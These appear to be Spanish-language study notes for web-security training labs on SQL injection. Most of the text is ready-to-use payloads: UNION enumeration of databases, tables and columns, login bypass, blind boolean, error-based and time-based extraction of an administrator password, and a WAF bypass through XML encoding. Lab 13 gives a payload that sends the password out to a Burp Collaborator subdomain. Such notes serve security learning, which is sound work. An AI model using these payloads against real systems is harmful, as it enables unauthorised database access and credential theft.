-----
### QUE ES?
Una **SQL Injection** es una vulnerabilidad donde un atacante introduce código SQL malicioso en un campo de entrada.  
Ocurre cuando la aplicación construye consultas a la base de datos sin validar correctamente el input.  
Permite cosas como saltarse logins, leer o modificar datos.  
Se previene usando consultas preparadas y no concatenando strings en las queries.
#### PASOS: 
- *ENCONTRAR EL NUMERO DE COLUMNAS:* `UNION SELECT 'NULL','NULL',...` hasta que no de error o liste cosas.
- *LISTAR BDS:* `UNION SELECT schema_name,null,null FROM information_schema.schemata` → movernos de null si no funciona en el primero
- *LISTAR TABLAS:* `UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='users'`
- *LISTAR COLUMNAS:* `UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users' AND table_schema='users``
- *PILLAR TODO:* `UNION SELECT * FROM users-- -` probar si no funciona `UNION SELECT user,pass FROM users-- -`
-----
### LAB1: SQLI IN WHERE
- Injección SQL en el parámetro category → `' or 1=1-- -`

### LAB2: SQLI LOGIN BYPASS
- Interceptamos la request de login → `'or 1=1-- -` → de esta forma se valida un true y nos mete como el usuario admin que es el primero en crearse normalmente.
### LAB3: QUERIYING THE DATABASE ORACLE
- Injeccion en el parametro category → nos permite listar el contenido de la base de datos → `'UNION SELECT 'abc','cde' FROM dual-- -` → `UNION SELECT banner, null FROM v$version-- -
### LAB4: QUERIYING THE DATABASE MYSQL Y MICROSOFT
-   Injeccion en el parametro category → nos permite listar el contenido de la base de datos → `'UNION SELECT 'abc','cde'-- -` → `UNION SELECT @@version, null-- -
### LAB5:  LISTING DATABASE
- *ENCONTRAR EL NUMERO DE COLUMNAS:* `UNION SELECT 'NULL','NULL',...-- -` hasta que no de error o liste cosas.
- *LISTAR BDS:* `UNION SELECT schema_name,null,null FROM information_schema.schemata-- -`
- *LISTAR TABLAS:* `UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='users'-- -`
- *LISTAR COLUMNAS:* `UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users' AND table_schema='users'-- -`
- *PILLAR TODO:* `UNION SELECT * FROM users-- -` probar si no funciona `UNION SELECT user,pass FROM users-- -`
### LAB6: LISTING DATABASE ORACLE
- *ENCONTRAR EL NUMERO DE COLUMNAS:* `UNION SELECT 'NULL','NULL',...FROM DUAL-- -` hasta que no de error o liste cosas.
- *LISTAR TABLAS:* `UNION SELECT table_name,null,null FROM all_tables`
- *LISTAR COLUMNAS:* `UNION SELECT column_name,null,null FROM all_tab_columns WHERE table_name='users'-- -`
- *PILLAR TODO:* `UNION SELECT * FROM users-- -` probar si no funciona `UNION SELECT user,pass FROM users-- -`
### LAB7: DETERMINING THE  NUMBER OF COLUMNS RETURNED BY THE QUERY
- *ENCONTRAR EL NUMERO DE COLUMNAS:* `UNION SELECT 'NULL','NULL',...-- -` hasta que no de error o liste cosas.
### LAB8: RETRIEVING A MULTIPLES VALUES IN A SINGLE SINGLE COLUMN 
- `UNION SELECT GROUP_CONCAT(username,password),null FROM users-- -` o `UNION SELECT null,||'~'|| FROM users-- -`
### LAB9: BLIND SQLI IN TRACKINGID WITH CONDITIONAL RESPONSES
- `TrackingId=xyz' AND '1'='1`
- `AND (SELECT 'a' FROM users LIMIT 1)='a'` Si existe al menos una fila en `users`, devuélveme la letra `'a'` Luego compara el resultado con `'a'`
- `AND (SELECT 'a' FROM users WHERE username='administrator')='a'` Si **existe** un usuario llamado _administrator_, la subconsulta devuelve `'a'`Luego compara el resultado con `'a'`
- `AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a ` sacar el largo de la password
- `AND (SELECT SUBSTRING(password,$$1$$,1) FROM users WHERE username='administrator')='$$a$$`  ir iterando por los caracteres para formar la contraseña
### LAB9: BLIND SQLI IN TRACKINGID WITH CONDITIONAL ERRORS ORACLE
- `TrackingId=xyz'||(SELECT '')||'` Cierra la cadena y concatena el resultado de una subconsulta que devuelve `''` para comprobar que la concatenación/inyección funciona.
- `TrackingId=xyz'||(SELECT '' FROM dual)||'` Variante Oracle: usa `DUAL` para hacer `SELECT` sin tabla real; test de ejecución de subconsulta.
- `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` Devuelve `''` desde `users` limitando a 1 fila con `ROWNUM=1`; test de que existe `users` 
- `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` Si la condición es TRUE fuerza un error (1/0) y si es FALSE devuelve `''`; se usa para obtener un canal TRUE/FALSE mediante errores.
- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` Si la longitud de `password` es > 1 provoca error; si no, devuelve `''`.
- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` Si el primer carácter de `password` es `'a'` provoca error; si no, devuelve `''` .
### LAB10:  VISIBLE ERROR-BASED SQL INJECTION
- `TrackingId=xyz' AND '1'='1`
- `' AND CAST((SELECT 1) AS int)--` Comprueba que puedes ejecutar subconsultas 
- `' AND 1=CAST((SELECT 1) AS int)--` Comprueba que puedes ejecutar subconsultas 
- HAY QUE JUGAR CON LO QUE DICEN LOS ERRORES:
- `' AND 1=CAST((SELECT username FROM users) AS int)--` para ver si existe la tabla -> el error tiene character truncation -> borrar caracteres del tracker
- `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` para evitar error de intento de mostrar varias columnas
- `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
### LAB11: BLIND SQL INJECTION WITH TIME DELAY
- `'x|| pg_sleep(10)-- -` Comprueba si es susceptible a ejecutar consultas
- **Oracle** 	`dbms_pipe.receive_message(('a'),10)
- **Microsoft** 	`WAITFOR DELAY '0:0:10'
- **PostgreSQL** 	`SELECT pg_sleep(10)
- **MySQL** 	`SELECT SLEEP(10) 
### LAB12: BLIND SQL INJECTION WITH TIME DELAY AND INFORMATION RETRIEVAL
- `'x|| pg_sleep(10)-- -` Comprueba si es susceptible a ejecutar consultas
- `ofT'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- - `confirma que hay user  admin
- `ofT'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- -` comprueba el largo de la pass
- `ofT'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='b') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- -` pillar pas con intruder
### LAB13: BLIND SQL INJECTION WITH OUT-OF-BAND DATA EXFILTRATION
- `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
- Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
- Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
- You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction,
### LAB14:  SQL INJECTION WITH FILTER BYPASS VIA XML ENCODING
La funcionalidad de **stock** envía `productId` y `storeId` en formato **XML**, y la inyección se realiza dentro del campo `<storeId>`.  
En **Burp Repeater** se prueba si el valor es evaluado sustituyéndolo por una expresión como `<storeId>1+1</storeId>`, comprobando que la aplicación calcula el resultado (devuelve el stock de la tienda 2).

Después se intenta una inyección `UNION SELECT` (`1 UNION SELECT NULL`) para identificar columnas, pero el WAF la bloquea.  
Para evadirlo, se ofusca el payload usando **Hackvertor** (codificando en `hex_entities` o `dec_entities`), ya que la inyección está dentro de XML.

Finalmente, al deducir que solo hay **una columna**, se concatenan `username` y `password` en un único campo (`username || '~' || password FROM users`) para extraer credenciales.
